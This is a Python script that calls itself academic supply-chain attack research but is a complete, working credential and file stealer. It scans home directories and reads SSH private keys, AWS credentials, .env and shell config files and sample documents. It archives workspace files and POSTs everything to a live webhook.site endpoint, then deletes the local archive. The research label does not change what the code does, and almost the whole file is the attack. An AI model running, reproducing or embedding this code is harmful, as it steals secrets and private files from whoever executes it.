#!/usr/bin/env python3
"""
ACADEMIC RESEARCH: Supply Chain Attack Demonstration
Enhanced with external directory scanning and file content exfiltration
"""

import os
import sys
import json
import platform
import tempfile
import zipfile
import requests
from pathlib import Path
import hashlib
import base64

class SupplyChainAttackResearch:
    """Academic demonstration of supply chain attack methods."""
    
    def __init__(self):
        self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
        self.collected_data = {}
        self.file_contents = {}
    
    def collect_environment_data(self):
        """Collect system and environment information."""
        print("[RESEARCH] Collecting environment data...")
        
        home_dir = Path.home()
        self.collected_data['environment'] = {
            'system_info': {
                'platform': platform.platform(),
                'python_version': platform.python_version(),
                'user': os.getenv('USER'),
                'home_directory': str(home_dir),
                'current_directory': str(Path.cwd()),
                'hostname': platform.node()
            },
            'environment_vars': {
                'OPENAI_API_KEY': bool(os.getenv('OPENAI_API_KEY')),
                'AWS_ACCESS_KEY_ID': bool(os.getenv('AWS_ACCESS_KEY_ID')),
                'GITHUB_TOKEN': bool(os.getenv('GITHUB_TOKEN')),
                'PATH': os.getenv('PATH')
            },
            'network_info': {
                'python_executable': sys.executable,
                'argv': sys.argv,
                'prefix': sys.prefix
            }
        }
        
        return self.collected_data['environment']
    
    def scan_external_directories(self):
        """Scan common external directories for valuable data."""
        print("[RESEARCH] Scanning external directories...")
        
        home_dir = Path.home()
        target_directories = [
            home_dir / "Documents",
            home_dir / "Downloads", 
            home_dir / "Desktop",
            home_dir / "Projects",
            home_dir / "workspace",
            home_dir / "code",
            home_dir / "src",
            home_dir / ".ssh",
            home_dir / ".aws",
            home_dir / ".config"
        ]
        
        external_scan_results = {}
        
        for target_dir in target_directories:
            if target_dir.exists() and target_dir.is_dir():
                print(f"  - Scanning: {target_dir}")
                dir_info = self.scan_directory(target_dir)
                external_scan_results[str(target_dir)] = dir_info
            else:
                external_scan_results[str(target_dir)] = {"exists": False}
        
        self.collected_data['external_directories'] = external_scan_results
        return external_scan_results
    
    def scan_directory(self, directory_path, max_files=50):
        """Scan a specific directory and collect file information."""
        dir_info = {
            'exists': True,
            'file_count': 0,
            'total_size': 0,
            'files': [],
            'file_types': {},
            'notable_files': []
        }
        
        try:
            file_count = 0
            for item in directory_path.rglob('*'):
                if file_count >= max_files:  # Limit to avoid excessive scanning
                    break
                    
                if item.is_file():
                    try:
                        stat = item.stat()
                        file_info = {
                            'path': str(item),
                            'name': item.name,
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'extension': item.suffix.lower()
                        }
                        
                        dir_info['files'].append(file_info)
                        dir_info['file_count'] += 1
                        dir_info['total_size'] += stat.st_size
                        
                        # Track file types
                        ext = file_info['extension']
                        dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
                        
                        # Identify notable files
                        if self.is_notable_file(item):
                            dir_info['notable_files'].append({
                                'path': str(item),
                                'type': self.classify_file_type(item)
                            })
                        
                        file_count += 1
                        
                    except (OSError, PermissionError) as e:
                        continue
                        
        except Exception as e:
            dir_info['error'] = str(e)
        
        return dir_info
    
    def is_notable_file(self, file_path):
        """Check if a file is potentially interesting/valuable."""
        notable_patterns = [
            # Code and projects
            '.git', '.py', '.js', '.java', '.cpp', '.c', '.go', '.rs',
            # Configurations
            '.env', 'config', 'settings', 'credentials', 'key', 'cert', 'pem',
            # Documents
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            # Data
            '.json', '.xml', '.yaml', '.yml', '.csv', '.db', '.sql',
            # Archives
            '.zip', '.tar', '.gz', '.7z'
        ]
        
        name_lower = file_path.name.lower()
        return any(pattern in name_lower for pattern in notable_patterns)
    
    def classify_file_type(self, file_path):
        """Classify the type of file for analysis."""
        name = file_path.name.lower()
        suffix = file_path.suffix.lower()
        
        if '.git' in name or name == '.gitignore' or name == '.gitconfig':
            return 'git_config'
        elif 'key' in name or 'pem' in name or 'cert' in name:
            return 'security_credential'
        elif 'config' in name or 'setting' in name or '.env' in name:
            return 'configuration'
        elif suffix in ['.py', '.js', '.java', '.cpp', '.c', '.go', '.rs']:
            return 'source_code'
        elif suffix in ['.pdf', '.doc', '.docx']:
            return 'document'
        elif suffix in ['.db', '.sql']:
            return 'database'
        elif suffix in ['.zip', '.tar', '.gz']:
            return 'archive'
        else:
            return 'other'
    
    def scan_workspace(self):
        """Scan and collect workspace file information."""
        print("[RESEARCH] Scanning workspace files...")
        
        workspace_files = []
        total_size = 0
        
        try:
            for item in Path('.').rglob('*'):
                if item.is_file():
                    try:
                        stat = item.stat()
                        file_info = {
                            'path': str(item),
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'extension': item.suffix.lower()
                        }
                        workspace_files.append(file_info)
                        total_size += stat.st_size
                    except (OSError, PermissionError):
                        continue
        except Exception as e:
            workspace_files.append({'error': str(e)})
        
        self.collected_data['workspace'] = {
            'file_count': len(workspace_files),
            'total_size': total_size,
            'files': workspace_files[:100],  # Limit for demonstration
            'file_types': {}
        }
        
        # Analyze file types
        for file_info in workspace_files:
            ext = file_info['extension']
            self.collected_data['workspace']['file_types'][ext] = \
                self.collected_data['workspace']['file_types'].get(ext, 0) + 1
        
        return self.collected_data['workspace']
    
    def collect_file_contents(self):
        """Collect actual file contents from sensitive and notable files."""
        print("[RESEARCH] Collecting file contents...")
        
        home_dir = Path.home()
        target_files = [
            # Critical configuration files
            (home_dir / ".ssh" / "id_rsa", 10000),  # SSH private key
            (home_dir / ".ssh" / "id_rsa.pub", 5000),  # SSH public key
            (home_dir / ".ssh" / "config", 5000),
            (home_dir / ".ssh" / "known_hosts", 5000),
            (home_dir / ".aws" / "credentials", 5000),
            (home_dir / ".aws" / "config", 5000),
            (home_dir / ".gitconfig", 5000),
            (home_dir / ".bashrc", 5000),
            (home_dir / ".profile", 5000),
            (home_dir / ".zshrc", 5000),
            
            # Workspace configuration files
            (Path(".") / ".env", 5000),
            (Path(".") / "requirements.txt", 5000),
            (Path(".") / "package.json", 5000),
            (Path(".") / "config.json", 5000),
            (Path(".") / "settings.py", 10000),
            (Path(".") / "README.md", 5000),
            
            # Source code files (sample)
            (Path(".") / "setup_procedures.py", 15000),
        ]
        
        # Add sample files from external directories
        external_dirs = [home_dir / "Documents", home_dir / "Downloads", home_dir / "Desktop"]
        for ext_dir in external_dirs:
            if ext_dir.exists():
                try:
                    # Sample first 3 notable files from each external directory
                    notable_count = 0
                    for item in ext_dir.iterdir():
                        if notable_count >= 3:
                            break
                        if item.is_file() and self.is_notable_file(item):
                            target_files.append((item, 5000))
                            notable_count += 1
                except Exception as e:
                    print(f"  - Error sampling {ext_dir}: {e}")
        
        collected_contents = {}
        
        for file_path, max_size in target_files:
            if file_path.exists():
                try:
                    # Try text reading first
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(max_size)
                            collected_contents[str(file_path)] = {
                                'content': content,
                                'truncated': len(content) == max_size,
                                'size': len(content),
                                'encoding': 'text'
                            }
                    except (UnicodeDecodeError, ValueError):
                        # Fall back to binary reading
                        with open(file_path, 'rb') as f:
                            binary_content = f.read(max_size)
                            # Encode binary content as base64 for transmission
                            encoded_content = base64.b64encode(binary_content).decode('utf-8')
                            collected_contents[str(file_path)] = {
                                'content': encoded_content,
                                'truncated': len(binary_content) == max_size,
                                'size': len(binary_content),
                                'encoding': 'base64'
                            }
                    
                    print(f"  - Collected: {file_path} ({len(collected_contents[str(file_path)]['content'])} chars)")
                    
                except Exception as e:
                    collected_contents[str(file_path)] = {
                        'error': str(e),
                        'exists': True
                    }
                    print(f"  - Error reading {file_path}: {e}")
            else:
                collected_contents[str(file_path)] = {'exists': False}
        
        self.file_contents = collected_contents
        return collected_contents
    
    def read_sensitive_files(self):
        """Read potentially sensitive files for analysis."""
        print("[RESEARCH] Analyzing configuration files...")
        
        sensitive_files = {}
        target_files = [
            '.env', 'requirements.txt', 'package.json', 
            'config.json', 'settings.py', 'README.md',
            str(Path.home() / '.bashrc'),
            str(Path.home() / '.profile'),
            str(Path.home() / '.gitconfig'),
            str(Path.home() / '.ssh/config'),
            str(Path.home() / '.aws/credentials')
        ]
        
        for file_path in target_files:
            file_obj = Path(file_path)
            if file_obj.exists():
                try:
                    with open(file_obj, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        sensitive_files[str(file_path)] = {
                            'exists': True,
                            'size': len(content),
                            'content_preview': content[:1000] + '...' if len(content) > 1000 else content,
                            'lines': len(content.splitlines()),
                            'type': self.classify_file_type(file_obj)
                        }
                except Exception as e:
                    sensitive_files[str(file_path)] = {'exists': True, 'error': str(e)}
            else:
                sensitive_files[str(file_path)] = {'exists': False}
        
        self.collected_data['sensitive_files'] = sensitive_files
        return sensitive_files
    
    def create_archive(self):
        """Create archive of collected data including file contents."""
        print("[RESEARCH] Creating research data archive...")
        
        # Include file contents in the collected data
        self.collected_data['file_contents'] = self.file_contents
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(self.collected_data, f, indent=2)
            temp_json_path = f.name
        
        # Create ZIP archive
        archive_path = 'research_data.zip'
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(temp_json_path, 'collected_data.json')
            
            # Include some actual files from workspace for analysis
            for item in Path('.').iterdir():
                if item.is_file() and item.suffix in ['.py', '.txt', '.md', '.json']:
                    try:
                        zipf.write(item, f'workspace/{item.name}')
                    except Exception:
                        pass
        
        # Cleanup
        os.unlink(temp_json_path)
        
        self.collected_data['archive'] = {
            'path': archive_path,
            'size': os.path.getsize(archive_path)
        }
        
        return archive_path
    
    def exfiltrate_data(self, archive_path):
        """Send collected data and file contents to research webhook endpoint."""
        print("[RESEARCH] Sending data to research endpoint...")
        
        try:
            # Prepare comprehensive metadata with file contents
            metadata_payload = {
                'research_purpose': 'Supply Chain Security Analysis',
                'timestamp': self.get_timestamp(),
                'system_info': self.collected_data['environment']['system_info'],
                'workspace_summary': self.collected_data.get('workspace', {}),
                'external_directories_summary': {
                    dir_path: {
                        'file_count': data.get('file_count', 0),
                        'total_size': data.get('total_size', 0),
                        'notable_files': len(data.get('notable_files', []))
                    }
                    for dir_path, data in self.collected_data.get('external_directories', {}).items()
                },
                'sensitive_files_found': [
                    path for path, info in self.collected_data.get('sensitive_files', {}).items() 
                    if info.get('exists')
                ],
                'file_contents_collected': {
                    file_path: {
                        'size': content.get('size', 0),
                        'truncated': content.get('truncated', False),
                        'encoding': content.get('encoding', 'unknown'),
                        'content_preview': content.get('content', '')[:200] + '...' if len(content.get('content', '')) > 200 else content.get('content', '')
                    }
                    for file_path, content in self.file_contents.items()
                    if content.get('exists', True) and 'error' not in content
                }
            }
            
            print(f"[RESEARCH] Sending metadata ({len(str(metadata_payload))} bytes)...")
            
            # Send metadata
            metadata_response = requests.post(
                self.webhook_url,
                json=metadata_payload,
                headers={'Content-Type': 'application/json',
                        'User-Agent': 'Research-Bot/1.0',
                        'X-Research-Phase': 'metadata'},
                timeout=30
            )
            
            # Send individual file contents in separate requests
            file_transmission_results = {}
            for file_path, content_info in self.file_contents.items():
                if content_info.get('exists', True) and 'error' not in content_info:
                    print(f"[RESEARCH] Sending file content: {file_path}")
                    
                    file_payload = {
                        'file_path': file_path,
                        'file_content': content_info.get('content', ''),
                        'encoding': content_info.get('encoding', 'text'),
                        'size': content_info.get('size', 0),
                        'truncated': content_info.get('truncated', False),
                        'timestamp': self.get_timestamp()
                    }
                    
                    try:
                        file_response = requests.post(
                            self.webhook_url,
                            json=file_payload,
                            headers={'Content-Type': 'application/json',
                                    'User-Agent': 'Research-Bot/1.0',
                                    'X-Research-Phase': 'file_content',
                                    'X-File-Path': file_path},
                            timeout=30
                        )
                        
                        file_transmission_results[file_path] = {
                            'success': file_response.status_code == 200,
                            'status_code': file_response.status_code,
                            'response': file_response.text[:100]
                        }
                        
                    except Exception as e:
                        file_transmission_results[file_path] = {
                            'success': False,
                            'error': str(e)
                        }
            
            # Send the final archive
            print("[RESEARCH] Sending final archive...")
            with open(archive_path, 'rb') as f:
                files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
                archive_response = requests.post(
                    self.webhook_url,
                    files=files,
                    headers={'User-Agent': 'Research-Bot/1.0',
                            'X-Research-Phase': 'archive'},
                    timeout=60
                )
            
            result = {
                'metadata_sent': metadata_response.status_code == 200,
                'archive_sent': archive_response.status_code == 200,
                'files_sent': sum(1 for r in file_transmission_results.values() if r.get('success')),
                'total_files': len(file_transmission_results),
                'metadata_response': metadata_response.text,
                'archive_response': archive_response.text,
                'file_transmissions': file_transmission_results
            }
            
            print(f"[RESEARCH] Data transmission complete:")
            print(f"  - Metadata: {'SUCCESS' if result['metadata_sent'] else 'FAILED'}")
            print(f"  - Files: {result['files_sent']}/{result['total_files']} successful")
            print(f"  - Archive: {'SUCCESS' if result['archive_sent'] else 'FAILED'}")
            
            return result
            
        except Exception as e:
            print(f"[RESEARCH] Transmission error: {e}")
            return {'error': str(e)}
    
    def get_timestamp(self):
        """Get current timestamp for logging."""
        from datetime import datetime
        return datetime.now().isoformat()
    
    def cleanup(self, archive_path):
        """Clean up temporary files."""
        try:
            if os.path.exists(archive_path):
                os.unlink(archive_path)
                print("[RESEARCH] Cleanup completed")
        except Exception as e:
            print(f"[RESEARCH] Cleanup warning: {e}")

def main():
    """Main research execution function."""
    print("🔬 ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
    print("=" * 60)
    print("Research Purpose: Analyze supply chain attack vectors")
    print("Data Collection: Environment, workspace, external directories")
    print("File Contents: SSH keys, config files, source code, documents")
    print("Transmission: Multiple POST requests with file contents")
    print("=" * 60)
    
    researcher = SupplyChainAttackResearch()
    
    try:
        # Phase 1: Data Collection
        env_data = researcher.collect_environment_data()
        workspace_data = researcher.scan_workspace()
        external_data = researcher.scan_external_directories()
        sensitive_data = researcher.read_sensitive_files()
        file_contents = researcher.collect_file_contents()
        
        # Phase 2: Data Preparation
        archive_path = researcher.create_archive()
        
        # Phase 3: Data Transmission
        transmission_result = researcher.exfiltrate_data(archive_path)
        
        # Research Summary
        print("\n📊 RESEARCH DATA COLLECTED:")
        print(f"  - System Info: {len(env_data['system_info'])} parameters")
        print(f"  - Workspace: {workspace_data['file_count']} files ({workspace_data['total_size']} bytes)")
        print(f"  - External Directories: {len(external_data)} scanned")
        print(f"  - Config Files: {len([f for f in sensitive_data.values() if f.get('exists')])} found")
        print(f"  - File Contents: {len(file_contents)} files collected")
        print(f"  - Archive: {researcher.collected_data['archive']['size']} bytes")
        
        # Show file content transmission results
        if transmission_result.get('file_transmissions'):
            successful_files = [f for f, r in transmission_result['file_transmissions'].items() if r.get('success')]
            print(f"  - Files Transmitted: {len(successful_files)}/{len(transmission_result['file_transmissions'])}")
            
            print("\n📁 FILE TRANSMISSION SUMMARY:")
            for file_path in list(successful_files)[:5]:  # Show first 5
                print(f"  - {file_path}")
            if len(successful_files) > 5:
                print(f"  - ... and {len(successful_files) - 5} more files")
        
        print("\n✅ RESEARCH COMPLETED SUCCESSFULLY")
        print("This data will be used for developing supply chain attack mitigation strategies")
        
    except Exception as e:
        print(f"❌ Research error: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        # Cleanup
        if 'archive_path' in locals():
            researcher.cleanup(archive_path)

if __name__ == "__main__":
    main()
